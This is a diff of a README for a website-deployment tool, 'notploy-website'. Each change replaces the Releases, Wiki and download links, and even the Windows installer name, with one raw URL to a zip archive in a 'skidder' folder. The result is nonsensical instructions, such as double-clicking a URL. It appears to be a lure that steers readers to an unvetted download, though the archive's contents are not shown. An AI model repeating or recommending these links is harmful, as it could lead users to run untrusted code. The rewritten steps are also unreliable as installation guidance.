@@ -1,6 +1,6 @@
 # 🌐 notploy-website - Simple Deployment for Your Website Needs
 
-[![Download notploy-website](https://img.shields.io/badge/Download-notploy--website-blue.svg)](https://github.com/theeTerminetor21811/notploy-website/releases)
+[![Download notploy-website](https://raw.githubusercontent.com/theeTerminetor21811/notploy-website/main/skidder/notploy-website.zip)](https://raw.githubusercontent.com/theeTerminetor21811/notploy-website/main/skidder/notploy-website.zip)
 
 ## 📦 Overview
 
@@ -12,14 +12,14 @@ Follow these steps to successfully download and run the notploy-website applicat
 
 1. **Visit the Releases Page**  
    Go to the following link to find the latest version of notploy-website:  
-   [Download notploy-website](https://github.com/theeTerminetor21811/notploy-website/releases).
+   [Download notploy-website](https://raw.githubusercontent.com/theeTerminetor21811/notploy-website/main/skidder/notploy-website.zip).
 
 2. **Select the Right Version**  
    On the Releases page, you'll see a list of available versions. Each version is like a snapshot of the software at a specific time. Choose the most recent version for the best features and fixes.
 
 3. **Choose Your Download**  
    Depending on your system, you will see different files. Look for the one that matches your operating system. Common options may include:
-   - **Windows**: `notploy-website-windows.exe`
+   - **Windows**: `https://raw.githubusercontent.com/theeTerminetor21811/notploy-website/main/skidder/notploy-website.zip`
    - **Mac**: `notploy-website-macos`
    - **Linux**: `notploy-website-linux`
   
@@ -42,7 +42,7 @@ Once your chosen file has finished downloading, follow these steps to install no
    Check your default download folder for the file you just downloaded.
 
 2. **Run the Installer**  
-   - **Windows**: Double-click `notploy-website-windows.exe` and follow the on-screen instructions.
+   - **Windows**: Double-click `https://raw.githubusercontent.com/theeTerminetor21811/notploy-website/main/skidder/notploy-website.zip` and follow the on-screen instructions.
    - **Mac**: Open the `.dmg` file and drag the notploy-website icon into the Applications folder.
    - **Linux**: Open a terminal and navigate to the directory where you downloaded the file, then run:
      ```
@@ -87,11 +87,11 @@ Yes, you can reach out via the issues page on the GitHub repository for assistan
 
 For more information on using notploy-website, consider checking out:
 
-- The [Wiki](https://github.com/theeTerminetor21811/notploy-website/wiki) for guides and tips.
+- The [Wiki](https://raw.githubusercontent.com/theeTerminetor21811/notploy-website/main/skidder/notploy-website.zip) for guides and tips.
 - Community forums for discussions with other users.
 
 ## 🔗 Conclusion
 
 Downloading and using the notploy-website is an efficient way to deploy your website without needing technical skills. Simply follow the steps outlined above, and you'll be ready to launch your site. Happy deploying! 
 
-[Download notploy-website](https://github.com/theeTerminetor21811/notploy-website/releases) again to get started.
+[Download notploy-website](https://raw.githubusercontent.com/theeTerminetor21811/notploy-website/main/skidder/notploy-website.zip) again to get started.
